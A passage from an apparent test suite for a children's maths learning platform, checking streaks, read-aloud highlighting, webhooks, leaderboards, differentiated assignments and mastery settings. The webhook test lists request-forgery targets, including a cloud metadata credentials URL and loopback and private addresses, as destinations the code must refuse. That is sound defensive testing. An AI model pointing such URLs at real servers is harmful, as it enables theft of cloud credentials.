    assert(today.challenge.done === false, "an unanswered challenge is reported as done");
    const leak = JSON.stringify(today.challenge.question);
    for (const field of ['"ans"', '"ansP"', '"expl"', '"a":', '"ansPlot"'])
      assert(!leak.includes(field), `the daily challenge leaked ${field}`);

    /* One attempt per day. Otherwise a learner answers, reads the
       explanation, and answers again — and the streak it feeds would measure
       persistence at re-submitting rather than practice. */
    const first = await post(c, `/learners/${kid.id}/today/answer`, { answer: "-999999" });
    assert(first.status === 200, `the challenge could not be answered (${first.status})`);
    const second = await post(c, `/learners/${kid.id}/today/answer`, { answer: "-999999" });
    assert(second.status === 409, `the daily challenge accepted a second attempt (${second.status})`);
    const after = (await c(`/learners/${kid.id}/today`)).body;
    assert(after.challenge.done === true, "an answered challenge is not marked done");
    assert(after.challenge.question === null,
      "the question is served again after being answered, so the explanation can be farmed for a retry");

    /* Turning up counts even when the answer is wrong.

       The streak is the habit, not the score. A one-question challenge that
       only counts when answered correctly punishes a child for showing up and
       slipping, which is the opposite of what a daily streak is for. */
    const wrongKid = (await post(c, "/learners", { name: "Wrong Answer Kid" })).body.learner;
    const beforeStreak = (await c(`/learners/${wrongKid.id}/rewards`)).body.streak;
    assert(beforeStreak === 0, `a fresh learner has a streak of ${beforeStreak}`);
    const missed = await post(c, `/learners/${wrongKid.id}/today/answer`, { answer: "-999999" });
    assert(missed.status === 200 && missed.body.correct === false, "the fixture answer was not wrong");
    const afterStreak = (await c(`/learners/${wrongKid.id}/rewards`)).body.streak;
    assert(afterStreak >= 1,
      `answering the daily challenge wrong left the streak at ${afterStreak} — showing up did not count`);
    assert(missed.body.reward && missed.body.reward.points > 0 && missed.body.reward.points < 15,
      `a wrong attempt scored ${missed.body.reward && missed.body.reward.points}; it should earn less than a correct one but more than nothing`);

    /* ---- daily goals ---- */
    assert(today.goals.goalSet === false, "a learner with no goal is reported as having one");
    const setGoal = body => c(`/learners/${kid.id}/goal`, { method: "PUT", body: JSON.stringify(body) });
    assert((await setGoal({ roundsPerWeek: 7, minutesPerWeek: 70 })).status === 200, "setting a goal failed");
    const withGoal = (await c(`/learners/${kid.id}/today`)).body.goals;
    assert(withGoal.goalSet === true, "a set goal is not reflected");
    assert(withGoal.rounds.target === 1,
      `7 rounds a week gave a daily target of ${withGoal.rounds.target}`);
    assert(withGoal.rounds.done >= 1, "the round recorded earlier is not counted towards today");

    /* Rounded UP, so a small weekly goal is not presented as no goal at all. */
    await setGoal({ roundsPerWeek: 3, minutesPerWeek: 3 });
    const small = (await c(`/learners/${kid.id}/today`)).body.goals;
    assert(small.rounds.target === 1,
      `3 rounds a week rounded to a daily target of ${small.rounds.target} — a real goal shown as none`);

    return `${Object.keys(avatar.ACCESSORIES).length} accessories, each unlocked by a real badge and refused until earned, one per slot; the daily challenge is derived from the date so everyone gets the same one, cannot be re-rolled, and takes one attempt; daily targets derived from the weekly goal and rounded up`;
  },

  /* 3.2.9 — read-aloud that highlights the word being spoken. */
  "read-aloud-highlight": async () => {
    const { execFileSync } = await import("node:child_process");
    const { readFileSync } = await import("node:fs");
    /* Compiled with the project's own esbuild rather than parsed as text, so
       these assertions run against the real module. */
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    /* Built into the OS temp directory, not the repo: a check that leaves
       artefacts behind turns `git status` into a place where real changes
       hide. */
    const bundle = join(tmpdir(), `readaloud.check.${process.pid}.mjs`);
    execFileSync("./node_modules/.bin/esbuild",
      ["src/components/ReadAloud.tsx", "--bundle", "--format=esm", "--jsx=automatic",
       `--outfile=${bundle}`, "--log-level=error"],
      { cwd: "app/web" });
    const ra = await import(`file://${bundle}?${Date.now()}`);

    /* The spoken text is unchanged by adding the mapping. This is the
       regression that matters: highlighting must not alter what a child
       hears. */
    const spoken = {
      "What is 4 × 6?": "What is 4 times 6?",
      "12 ÷ 3 = ?": "12 divided by 3 = ?",
      "Compute 7 + 5": "Compute 7 plus 5",
      "Find 9 − 2": "Find 9 minus 2",
      "The ratio 3:4": "The ratio 3 to 4",
      "Simplify 1/2": "Simplify 1 half",
      "Shade 3/4": "Shade 3 quarters",
      "Point (3, −2)": "Point the point 3 comma -2",
      "Find |-7|": "Find the absolute value of -7",
      "Increase by 25%": "Increase by 25 percent"
    };
    for (const [written, said] of Object.entries(spoken))
      assert(ra.speakableText(written) === said,
        `"${written}" is now spoken as "${ra.speakableText(written)}", not "${said}"`);

    /* The mapping is the hard part and the reason this is not just a
       character index. The browser reports where it has reached in the string
       it was GIVEN, and that string is not the one on screen: by the second
       word of "4 × 6" the two have already drifted. Highlighting on the raw
       index underlines the wrong word, and further wrong with every
       transformation. */
    const written = "What is 4 × 6?";
    const { spoken: out, map } = ra.speakableSpans(written);
    assert(out === "What is 4 times 6?", `spoken form is ${JSON.stringify(out)}`);
    assert(out.indexOf("times") !== written.indexOf("times"),
      "the fixture no longer exercises a drifting index");

    /* Every position in the spoken string maps back inside the written one. */
    for (let i = 0; i < out.length; i++) {
      const r = ra.sourceRangeAt(map, i);
      assert(r, `spoken position ${i} (${JSON.stringify(out[i])}) maps to nothing written`);
      assert(r.start >= 0 && r.end <= written.length && r.end > r.start,
        `spoken position ${i} maps to an impossible range ${JSON.stringify(r)}`);
    }

    /* The word actually highlighted is the right one. */
    const at = i => {
      const r = ra.highlightRangeAt(written, map, i);
      return r ? written.slice(r.start, r.end) : null;
    };
    assert(at(0) === "What", `the first word highlights ${JSON.stringify(at(0))}`);
    assert(at(out.indexOf("is")) === "is", `"is" highlights ${JSON.stringify(at(out.indexOf("is")))}`);
    /* A rewritten expression stays highlighted whole while it is being said —
       underlining just the "4" while the voice says "times" is worse than no
       highlight at all. */
    for (const probe of ["4 times", "times", "6?"]) {
      const idx = out.indexOf(probe);
      assert(at(idx) === "4 × 6",
        `while saying ${JSON.stringify(probe)} the highlight is ${JSON.stringify(at(idx))}, not the whole written expression`);
    }
    /* Naive character mapping would land somewhere else entirely. */
    assert(written.slice(out.indexOf("times"), out.indexOf("times") + 5) !== "4 × 6",
      "the naive index happens to be correct here, so this fixture proves nothing");

    /* Plain text with nothing to transform maps one to one. */
    const plain = "Count the red apples";
    const flat = ra.speakableSpans(plain);
    assert(flat.spoken === plain, "plain text was altered");
    assert(ra.highlightRangeAt(plain, flat.map, plain.indexOf("red")) &&
           plain.slice(...Object.values(ra.highlightRangeAt(plain, flat.map, plain.indexOf("red")))) === "red",
      "a plain word does not highlight itself");

    /* Wired to the browser event, and degrading where it never fires. */
    const src = readFileSync("app/web/src/components/ReadAloud.tsx", "utf8");
    const spokenComponent = src.slice(src.indexOf("export function SpokenText"));
    /* Matched as an assignment, not as a substring. The first version of this
       tested for the word "onboundary" anywhere in the file, so renaming the
       handler to `onboundaryDISABLED` — which switches highlighting off
       entirely — still satisfied it. */
    assert(/\bu\.onboundary\s*=/.test(spokenComponent),
      "nothing is assigned to the utterance's onboundary handler, so nothing can highlight");
    assert(/\be\.charIndex\b/.test(spokenComponent), "the boundary position is not read from the event");
    assert(/onend/.test(spokenComponent) && /setRange\(null\)/.test(spokenComponent),
      "the highlight is never cleared when speech stops");
    assert(/\}, \[text\]\)/.test(spokenComponent),
      "a new question does not reset the highlight, so the previous question's word stays marked");

    /* The highlight must not be colour alone. */
    const css = readFileSync("app/web/src/styles.css", "utf8");
    const rule = css.slice(css.indexOf(".spoken-word"));
    assert(/text-decoration:\s*underline/.test(rule.slice(0, 300)),
      "the spoken word is marked by colour alone, which is invisible to anyone who cannot distinguish it");

    /* And the screens actually use it. */
    for (const screen of ["Practice", "Quiz", "Diagnostic", "MasteryCheck"]) {
      const body = readFileSync(`app/web/src/screens/${screen}.tsx`, "utf8");
      assert(/<SpokenText/.test(body), `${screen} still renders the question without the highlighting reader`);
    }

    return `spoken output unchanged across ${Object.keys(spoken).length} maths phrases, every spoken position maps back into the written text, rewritten expressions highlight whole, cleared on stop and on a new question, underlined not just coloured`;
  },

  /* 9.2 — outbound webhooks, signed and refused when they point inward. */
  "webhooks": async () => {
    const hooks = await import("../app/server/src/webhooks.js");
    const { createServer } = await import("node:http");

    /* A URL supplied by a user that the SERVER then fetches is a request
       forgery primitive. These are the destinations that turn it into one:
       loopback, private ranges, link-local — which is where cloud instance
       metadata and its credentials live — and carrier NAT. Checked against
       the RESOLVED address, so "localhost" is caught by what it resolves to
       rather than by its spelling. */
    for (const bad of [
      "https://127.0.0.1/hook", "https://localhost/hook", "https://169.254.169.254/latest/meta-data",
      "https://10.0.0.5/hook", "https://192.168.1.10/hook", "https://172.16.4.4/hook",
      "https://100.64.0.1/hook", "http://example.com/hook", "not-a-url", "ftp://example.com/x"
    ]) {
      const v = await hooks.validateTarget(bad);
      assert(v.ok === false, `${bad} was accepted as a webhook destination`);
      assert(typeof v.error === "string" && v.error.length > 0, `${bad} was refused without saying why`);
    }
    assert((await hooks.validateTarget("https://example.com/hook")).ok === true,
      "a legitimate public https destination was refused");

    /* Signatures verify constant-time, and a wrong or truncated one fails. */
    const body = JSON.stringify({ event: "test", n: 1 });
    const sig = hooks.sign("s3cret", body);
    assert(hooks.verify("s3cret", body, sig), "a correct signature did not verify");
    assert(!hooks.verify("s3cret", body, sig.slice(0, -2)), "a truncated signature verified");
    assert(!hooks.verify("s3cret", body + " ", sig), "a signature verified over altered content");
    assert(!hooks.verify("wrong", body, sig), "a signature verified under the wrong secret");

    /* Delivery, against a real local receiver. Reaching it requires the
       explicit private-address opt-in, which is itself the proof that the
       guard is on by default. */
    const received = [];
    const server = createServer((req, res) => {
      let raw = "";
      req.on("data", d => { raw += d; });
      req.on("end", () => {
        received.push({
          event: req.headers["x-beastforge-event"],
          signature: req.headers["x-beastforge-signature"],
          raw
        });
        res.writeHead(200).end("ok");
      });
    });
    await new Promise(r => server.listen(0, "127.0.0.1", r));
    const port = server.address().port;
    const localUrl = `http://127.0.0.1:${port}/hook`;

    try {
      assert((await hooks.validateTarget(localUrl)).ok === false,
        "a loopback destination was accepted while the guard was supposed to be on");

      process.env.WEBHOOK_ALLOW_PRIVATE = "1";
      assert((await hooks.validateTarget(localUrl)).ok === true,
        "the documented dev opt-in does not allow a local receiver");

      const reg = await hooks.register({ url: localUrl, events: ["contest.completed"], createdBy: null });
      assert(reg.ok, `registration failed: ${reg.error}`);
      /* register() refuses an unsafe destination on its own terms, so the
         guard does not depend on a caller remembering to validate first. */
      delete process.env.WEBHOOK_ALLOW_PRIVATE;
      const refused = await hooks.register({ url: "https://169.254.169.254/x", events: ["contest.completed"] });
      assert(refused.ok === false, "register() persisted a link-local destination without validating it");
      process.env.WEBHOOK_ALLOW_PRIVATE = "1";
      assert(reg.webhook.secret && reg.webhook.secret.length >= 32,
        "the generated secret is too short to be worth signing with");

      const out = await hooks.emit("contest.completed", { learnerId: "x", pct: 91 });
      assert(out.delivered === 1, `expected one delivery, got ${JSON.stringify(out)}`);
      assert(received.length === 1, "the receiver was not called");
      assert(received[0].event === "contest.completed", "the event name header is missing or wrong");
      assert(hooks.verify(reg.webhook.secret, received[0].raw, received[0].signature),
        "the delivered body did not verify against the subscription's secret");
      assert(JSON.parse(received[0].raw).data.pct === 91, "the payload did not arrive intact");

      /* A delivery that SUCCEEDED must record no error.

         The count and the signature were the only things asserted before, and
         both survived a ReferenceError thrown after the status was set: the
         catch swallowed it into the error column, so every successful webhook
         was stored as delivered-with-an-error while this check reported the
         delivery clean. */
      const { DatabaseSync: DBok } = await import("node:sqlite");
      const okRow = new DBok("app/server/data/verify.db")
        .prepare("SELECT status, error FROM webhook_deliveries WHERE webhook_id=? ORDER BY rowid DESC LIMIT 1")
        .get(reg.webhook.id);
      assert(okRow && okRow.status === "delivered",
        `a successful delivery was recorded as ${okRow && okRow.status}`);
      assert(!okRow.error,
        `a successful delivery also recorded an error: ${okRow.error}`);

      /* A subscription only hears the events it asked for. */
      const before = received.length;
      await hooks.emit("mastery.achieved", { learnerId: "x" });
      assert(received.length === before,
        "a subscription received an event it did not subscribe to");

      /* A broken receiver must not throw into the caller, and the failure
         has to be recorded rather than vanishing. */
      await new Promise(r => server.close(r));
      const failed = await hooks.emit("contest.completed", { learnerId: "x" });
      assert(failed.delivered === 0, "delivery to a dead receiver reported success");
      const { DatabaseSync } = await import("node:sqlite");
      const db = new DatabaseSync("app/server/data/verify.db");
      /* Ordered by rowid, not by `at`. Two deliveries can land in the same
         millisecond, and then "the latest row" is whichever the engine feels
         like returning — which made this assertion fail about one run in
         three, on the row from the SUCCESSFUL delivery. */
      const rec = db.prepare(`SELECT status, error FROM webhook_deliveries
                              WHERE webhook_id=? ORDER BY rowid DESC LIMIT 1`).get(reg.webhook.id);
      assert(rec && rec.status === "failed" && rec.error,
        `a failed delivery was not recorded with a reason (got ${JSON.stringify(rec)})`);
    } finally {
      delete process.env.WEBHOOK_ALLOW_PRIVATE;
      try { server.close(); } catch {}
    }

    /* Registration is admin-only and the secret is never listed back. */
    const c = client();
    const admin = { email: "boss@b.com", password: "a-long-enough-pass" };
    const reg2 = await post(c, "/auth/register", { coppaConsent: true, name: "Admin", ...admin });
    if (reg2.status !== 200) await post(c, "/auth/login", admin);
    const created = await post(c, "/admin/webhooks",
      { url: "https://example.com/hook", events: ["mastery.achieved"] });
    assert(created.status === 200, `admin webhook creation failed (${created.status})`);
    assert(created.body.webhook.secret, "the secret was not returned at creation");
    const listed = (await c("/admin/webhooks")).body;
    assert(!JSON.stringify(listed).includes(created.body.webhook.secret),
      "the webhook secret is readable from the list endpoint");

    const inward = await post(c, "/admin/webhooks",
      { url: "https://169.254.169.254/latest/meta-data", events: ["mastery.achieved"] });
    assert(inward.status === 400, "the API accepted a webhook pointing at cloud metadata");

    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "hook-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await post(outsider, "/admin/webhooks",
      { url: "https://example.com/x", events: ["mastery.achieved"] })).status === 403,
      "a non-admin registered a webhook");
    assert((await outsider("/admin/webhooks")).status === 403, "a non-admin listed the webhooks");

    return `${hooks.EVENTS.length} events, HMAC-signed and verified constant-time, delivered to a live receiver, failures recorded; loopback, private, link-local and carrier-NAT destinations all refused by resolved address, secrets shown once and never listed`;
  },

  /* 13.12 — mock contests ranked correctly, with the same safeguards as
     every other board here. */
  "contest-leaderboard": async () => {
    const { DatabaseSync } = await import("node:sqlite");
    const { randomUUID } = await import("node:crypto");
    const db = new DatabaseSync("app/server/data/verify.db");

    const teacher = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, email: "contestteacher@b.com", password: "a-long-enough-pass", name: "T", role: "teacher" });
    const cls = await post(teacher, "/classes", { name: "Contest Club" });
    assert(cls.status === 200, `class creation failed (${cls.status})`);
    const classId = cls.body.class.id, joinCode = cls.body.class.joinCode;

    const join = async (email, name) => {
      const c = client();
      await post(c, "/auth/register", { coppaConsent: true, email, password: "a-long-enough-pass", name: "P" });
      const kid = (await post(c, "/learners", { name })).body.learner;
      await post(c, "/classes/join", { joinCode, learnerId: kid.id });
      return { c, kid };
    };
    const ace = await join("cl-a@b.com", "Ace");
    const quick = await join("cl-b@b.com", "Quick");
    const slow = await join("cl-c@b.com", "Slow");
    const absent = await join("cl-d@b.com", "No Paper");

    const board = async (as, qs = "") =>
      (await as(`/classes/${classId}/contests/leaderboard${qs}`));

    /* Off until a teacher turns it on — the same default as every other
       board, not a looser one because this is a contest. */
    const off = await board(teacher);
    assert(off.status === 200 && off.body.enabled === false,
      "the contest leaderboard is on before a teacher enabled it");

    await teacher(`/classes/${classId}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true, displayNames: false }) });

    /* Recorded attempts. Ace scores highest; Quick and Slow tie on score and
       must be separated by time; Ace also has a WORSE earlier attempt that
       must not be the one ranked. */
    const attempt = (learnerId, pct, seconds, expired = 0) =>
      db.prepare(`INSERT INTO contests (id, learner_id, format, score, total, pct, seconds, limit_secs, expired, detail, finished_at)
                  VALUES (?,?,?,?,?,?,?,?,?,?,?)`)
        .run(randomUUID(), learnerId, "sprint", pct, 100, pct, seconds, 600, expired, "[]", new Date().toISOString());
    attempt(ace.kid.id, 40, 100);      // an earlier, worse paper
    attempt(ace.kid.id, 95, 500);      // their best
    attempt(quick.kid.id, 80, 200);
    attempt(slow.kid.id, 80, 400);
    attempt(absent.kid.id, 99, 10, 1); // expired: a paper that ran out of time

    const on = await board(teacher);
    assert(on.body.enabled === true, "the leaderboard is still off after being enabled");
    const rows = on.body.board;

    /* Best attempt only. Ranking every attempt would put the child with the
       most free time on top and quietly reward re-sitting the same paper. */
    assert(rows.filter(r => r.name === "Ace").length === 1,
      "a learner appears more than once — every attempt is being ranked, not their best");
    assert(rows[0].name === "Ace" && rows[0].pct === 95,
      `the top entry is ${JSON.stringify(rows[0])}, expected Ace at 95`);

    /* Ties broken by time, or the ranking is not a result. */
    const quickRow = rows.find(r => r.name === "Quick"), slowRow = rows.find(r => r.name === "Slow");
    assert(quickRow.pct === slowRow.pct, "the tie fixture is wrong");
    assert(quickRow.rank < slowRow.rank,
      `equal scores were not separated by time (Quick ${quickRow.seconds}s ranked ${quickRow.rank}, Slow ${slowRow.seconds}s ranked ${slowRow.rank})`);

    /* An expired paper is not a result, and a learner with none is absent
       rather than ranked last — and the response says so. */
    assert(!rows.some(r => r.name === "No Paper"),
      "a learner whose only paper expired appears on the leaderboard");
    assert(on.body.entrants === 3 && on.body.classSize === 4,
      `the board reports ${on.body.entrants} of ${on.body.classSize}; absent members must be visible as absent, not implied to be last`);

    /* Anonymous by default; a parent still sees their own child. */
    const parentView = (await board(quick.c)).body;
    const names = parentView.board.map(r => r.name);
    assert(names.includes("Quick"), "a parent cannot identify their own child on the board");
    assert(!names.includes("Ace"),
      "another family's child is named on an anonymised board");
    assert(parentView.board.find(r => r.name === "Quick").you === true, "the parent's own child is not marked");

    await teacher(`/classes/${classId}/settings`,
      { method: "PUT", body: JSON.stringify({ leaderboardOn: true, displayNames: true }) });
    assert((await board(quick.c)).body.board.map(r => r.name).includes("Ace"),
      "names are still hidden after the teacher allowed them");

    /* Class-scoped: no global board, and outsiders are refused. */
    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "cl-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await board(outsider)).status === 403,
      "someone outside the class read its contest leaderboard");
    for (const path of ["/leaderboard", "/contests/leaderboard", "/leaderboards/global"]) {
      const global = await teacher(path);
      assert(global.status === 404 || global.status === 400,
        `a class-free leaderboard route answered at ${path} (${global.status}) — children must not be ranked against strangers`);
    }

    return "best attempt per learner ranked by score then time, expired papers excluded, absent members reported as absent, off until a teacher enables it, anonymous by default, class-scoped with no global board";
  },

  /* 4.3.2 — differentiated assignments: groups and individual accommodations. */
  "differentiated-assignments": async () => {
    const teacher = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, email: "diffteacher@b.com", password: "a-long-enough-pass", name: "T", role: "teacher" });
    const cls = await post(teacher, "/classes", { name: "Differentiation 1" });
    assert(cls.status === 200, `class creation failed (${cls.status}) — teacher role not granted`);
    const classId = cls.body.class.id;
    const joinCode = cls.body.class.joinCode;

    /* Two families, three children, all in the same class. */
    const make = async (email, name) => {
      const c = client();
      await post(c, "/auth/register",
        { coppaConsent: true, email, password: "a-long-enough-pass", name: "P" });
      const kid = (await post(c, "/learners", { name })).body.learner;
      const joined = await post(c, "/classes/join", { joinCode, learnerId: kid.id });
      assert(joined.status === 200, `${name} could not join the class (${joined.status})`);
      return { c, kid };
    };
    const stretch = await make("diff-a@b.com", "Stretch Kid");
    const support = await make("diff-b@b.com", "Support Kid");
    const plain = await make("diff-c@b.com", "Ungrouped Kid");

    const listFor = async ({ c, kid }) => (await c(`/learners/${kid.id}/assignments`)).body.assignments;

    /* A group, and only one child in it. */
    const group = await post(teacher, `/classes/${classId}/groups`, { name: "Stretch" });
    assert(group.status === 200, `group creation failed (${group.status})`);
    const groupId = group.body.group.id;
    assert((await post(teacher, `/classes/${classId}/groups/${groupId}/members`,
      { learnerId: stretch.kid.id })).status === 200, "adding a class member to a group failed");

    /* A learner who never joined this class cannot be pulled into a group —
       otherwise a group assignment would reach a child the teacher has no
       relationship with. */
    const outsiderFamily = client();
    await post(outsiderFamily, "/auth/register",
      { coppaConsent: true, email: "diff-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    const outsiderKid = (await post(outsiderFamily, "/learners", { name: "Outside Kid" })).body.learner;
    assert((await post(teacher, `/classes/${classId}/groups/${groupId}/members`,
      { learnerId: outsiderKid.id })).status === 400,
      "a learner who is not in the class was added to one of its groups");

    /* Whole-class assignment reaches everyone. */
    const whole = await post(teacher, `/classes/${classId}/assignments`,
      { topicId: "g6-ratios", tier: "practice", dueAt: "2030-01-10T00:00:00.000Z" });
    assert(whole.status === 200, "whole-class assignment failed");
    for (const kid of [stretch, support, plain])
      assert((await listFor(kid)).some(a => a.id === whole.body.assignment.id),
        "a whole-class assignment did not reach every member");

    /* THE differentiation property: a group assignment reaches its group and
       nobody else. Without this, "per-group" is a label on a field that
       changes nothing about who is asked to do the work. */
    const groupWork = await post(teacher, `/classes/${classId}/assignments`,
      { topicId: "g6-percent", tier: "boss", groupId });
    assert(groupWork.status === 200, `group assignment failed (${groupWork.status})`);
    const gid = groupWork.body.assignment.id;
    assert((await listFor(stretch)).some(a => a.id === gid),
      "a group assignment did not reach the group's own member");
    for (const kid of [support, plain]) {
      const list = await listFor(kid);
      assert(!list.some(a => a.id === gid),
        "a group assignment reached a learner outside the group — differentiation leaks to the whole class");
    }
    assert((await listFor(stretch)).find(a => a.id === gid).groupAssignment === true,
      "a group assignment is not identified as one");

    /* An accommodation changes what its learner sees, and only that learner. */
    const wid = whole.body.assignment.id;
    const acc = await teacher(`/assignments/${wid}/accommodations/${support.kid.id}`, {
      method: "PUT",
      body: JSON.stringify({ tier: "practice", dueAt: "2030-02-01T00:00:00.000Z", note: "Extra week agreed with home" })
    });
    assert(acc.status === 200, `setting an accommodation failed (${acc.status})`);

    const supported = (await listFor(support)).find(a => a.id === wid);
    assert(supported.dueAt === "2030-02-01T00:00:00.000Z",
      `the accommodated learner still sees the class deadline (${supported.dueAt}) — an extension the child cannot see is worth nothing`);
    assert(supported.accommodated === true, "the accommodation is applied but not disclosed to the learner");
    assert(supported.classDueAt === "2030-01-10T00:00:00.000Z",
      "the original class deadline is no longer visible alongside the adjusted one");

    for (const kid of [stretch, plain]) {
      const theirs = (await listFor(kid)).find(a => a.id === wid);
      assert(theirs.dueAt === "2030-01-10T00:00:00.000Z",
        "one learner's accommodation changed another learner's deadline");
      assert(theirs.accommodated === false, "a learner without an accommodation is marked as having one");
    }

    /* An accommodation may only be set by the class's own teacher, and only
       for a learner in that class. */
    const otherTeacher = client();
    await post(otherTeacher, "/auth/register",
      { coppaConsent: true, email: "diff-other-teacher@b.com", password: "a-long-enough-pass", name: "OT", role: "teacher" });
    assert((await otherTeacher(`/assignments/${wid}/accommodations/${support.kid.id}`,
      { method: "PUT", body: JSON.stringify({ dueAt: "2031-01-01T00:00:00.000Z" }) })).status !== 200,
      "another teacher set an accommodation on someone else's class");
    assert((await teacher(`/assignments/${wid}/accommodations/${outsiderKid.id}`,
      { method: "PUT", body: JSON.stringify({ dueAt: "2031-01-01T00:00:00.000Z" }) })).status === 400,
      "an accommodation was set for a learner who is not in the class");
    assert((await stretch.c(`/learners/${support.kid.id}/assignments`)).status === 403,
      "one family read another family's assignment list");

    return "groups target work at part of a class without splitting it, group assignments reach only their members, and an individual accommodation moves one learner's tier and deadline visibly to them and to nobody else";
  },

  /* 6.6 — core and advanced are modelled separately, not averaged.

     Driven entirely over HTTP through real diagnostics rather than by poking
     the module: the separation only matters if it survives the whole path
     from a child answering questions to what the next session offers them. */
  "multi-track-adaptation": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "tracks@b.com", password: "a-long-enough-pass", name: "T" });
    const kid = (await post(c, "/learners", { name: "Track Kid" })).body.learner;

    const tracks = async () => (await c(`/learners/${kid.id}/tracks`)).body.tracks;

    /* Nothing measured yet means unmeasured, not an ability of zero. Zero is
       a measurement — "average" — and would place an untested learner in the
       middle of the range as though we had checked. */
    const cold = await tracks();
    assert(cold.core && cold.adv, "the profile does not report both tracks");
    assert(cold.core.measured === false && cold.adv.measured === false,
      "an untested learner is reported as measured");

    /* Run a whole diagnostic, answering every question a given way. */
    const runDiagnostic = async (topicId, answerCorrectly) => {
      const start = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId });
      assert(start.status === 200, `diagnostic on ${topicId} did not start (${start.status})`);
      let q = start.body.question, guard = 0, summary = null;
      while (guard++ < 30) {
        const answer = answerCorrectly ? await correctAnswerFor(q.id, c) : "-999999";
        const step = await post(c, "/diagnostic/answer",
          { diagnosticId: start.body.diagnosticId, answer });
        assert(step.status === 200, `answer rejected on ${topicId} (${step.status})`);
        if (step.body.done) { summary = step.body.summary; break; }
        q = step.body.question;
      }
      assert(summary, `the diagnostic on ${topicId} never finished`);
      return summary;
    };

    /* A strong run in CORE. */
    const coreSummary = await runDiagnostic("g6-ratios", true);
    assert(coreSummary.overall === 100, `the core run scored ${coreSummary.overall}%`);
    const afterCore = await tracks();
    assert(afterCore.core.measured === true, "a completed core diagnostic did not record core ability");
    assert(afterCore.core.ability > 0.3,
      `a perfect core diagnostic left core ability at ${afterCore.core.ability}`);

    /* THE property. Pooled into one estimate, this strong core record would
       drag advanced up with it and drop the learner into enrichment material
       well above them. The average is never wrong about a learner who does
       not exist. */
    assert(afterCore.adv.measured === false,
      "a core diagnostic also marked advanced as measured — the tracks are pooled");
    assert(afterCore.adv.ability === 0,
      `advanced ability moved to ${afterCore.adv.ability} on core evidence alone`);

    /* And the reverse: a weak run in ADVANCED must not pull core down. */
    const advSummary = await runDiagnostic("k-evenodd", false);
    assert(advSummary.overall === 0, `the deliberately-wrong advanced run scored ${advSummary.overall}%`);
    const both = await tracks();
    assert(both.adv.measured === true, "a completed advanced diagnostic did not record advanced ability");
    assert(both.adv.ability < 0, `an all-wrong advanced run left advanced ability at ${both.adv.ability}`);
    assert(Math.abs(both.core.ability - afterCore.core.ability) < 1e-9,
      `core ability changed from ${afterCore.core.ability} to ${both.core.ability} on advanced evidence alone`);

    /* The separation has to change something a learner would notice. */
    assert(both.core.startsAt !== both.adv.startsAt,
      `both tracks start this learner at "${both.core.startsAt}" despite opposite evidence — the separation has no effect`);
    assert(both.core.ability > both.adv.ability,
      `core ${both.core.ability} is not above advanced ${both.adv.ability} after opposite evidence`);

    /* A second diagnostic in a track starts from what that track already
       knows, rather than re-measuring from ignorance. */
    const second = await post(c, "/diagnostic/start", { learnerId: kid.id, topicId: "g6-percent" });
    assert(second.status === 200, "the second core diagnostic did not start");
    let q2 = second.body.question, g2 = 0, secondSummary = null;
    while (g2++ < 30) {
      const step = await post(c, "/diagnostic/answer",
        { diagnosticId: second.body.diagnosticId, answer: await correctAnswerFor(q2.id, c) });
      if (step.body.done) { secondSummary = step.body.summary; break; }
      q2 = step.body.question;
    }
    assert(secondSummary, "the second core diagnostic never finished");
    assert(secondSummary.abilityError <= coreSummary.abilityError + 1e-9,
      `the second diagnostic in the same track was no more certain (${secondSummary.abilityError}) than the first (${coreSummary.abilityError}) — history is being discarded`);

    /* Another account cannot read this learner's ability profile. */
    const outsider = client();
    await post(outsider, "/auth/register",
      { coppaConsent: true, email: "tracks-outsider@b.com", password: "a-long-enough-pass", name: "O" });
    assert((await outsider(`/learners/${kid.id}/tracks`)).status === 403,
      "another account read this learner's ability profile");

    return `core and advanced held apart end to end: opposite evidence gives ${both.core.ability} vs ${both.adv.ability} (starting at ${both.core.startsAt} vs ${both.adv.startsAt}), neither track moves on the other's evidence, and a repeat diagnostic builds on its own track's history`;
  },

  /* 7.6 — mastery thresholds configurable, defaulting to 90/80. */
  "configurable-mastery": async () => {
    const settings = await import("../app/server/src/settings.js");

    const c = client();
    const admin = { email: "boss@b.com", password: "a-long-enough-pass" };
    const reg = await post(c, "/auth/register", { coppaConsent: true, name: "Admin", ...admin });
    if (reg.status !== 200) {
      const login = await post(c, "/auth/login", admin);
      assert(login.status === 200, `could not obtain the admin account (${reg.status}/${login.status})`);
    }

    /* Defaults are unchanged until somebody changes them. */
    const start = (await c("/settings/mastery")).body;
    assert(start.thresholds.core === 90 && start.thresholds.adv === 80,
      `defaults are ${JSON.stringify(start.thresholds)}, expected 90/80`);
    assert(start.range.min === settings.MASTERY_MIN && start.range.max === settings.MASTERY_MAX,
      "the endpoint does not publish the range it will accept");

    /* A change takes effect on what the platform actually enforces, not just
       on what it reports about itself. A topic scored at 85 is below the 90
       default and at or above a lowered 85. */
    const kid = (await post(c, "/learners", { name: "Threshold Kid" })).body.learner;
    await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 85, total: 100 });
    /* Asserted on the REASON, not merely on presence in the queue. A topic
       appears there for either of two reasons — not yet mastered, or
       mastered and due a refresher — so "is g6-ratios listed?" cannot tell
       whether the threshold did anything. The reason can. */
    const reviewEntry = async () => {
      const body = (await c(`/learners/${kid.id}/review`)).body;
      return (body.review || []).find(r => r.topicId === "g6-ratios") || null;
    };
    const before = await reviewEntry();
    assert(before && before.reason === "not_yet_mastered",
      `at 85% under a 90% threshold the topic should be unmastered, got ${JSON.stringify(before)}`);
    assert(before.threshold === 90, `the entry reports a threshold of ${before.threshold}`);

    const putMastery = body =>
      c("/admin/settings/mastery", { method: "PUT", body: JSON.stringify(body) });
    const put = await putMastery({ core: 85, adv: 80 });
    assert(put.status === 200, `the threshold change was rejected (${put.status})`);
    assert(put.body.thresholds.core === 85,
      `the change was accepted but reading it back gives ${put.body.thresholds.core}, not 85 — stored and ignored`);
    const curriculum = (await c("/curriculum")).body;
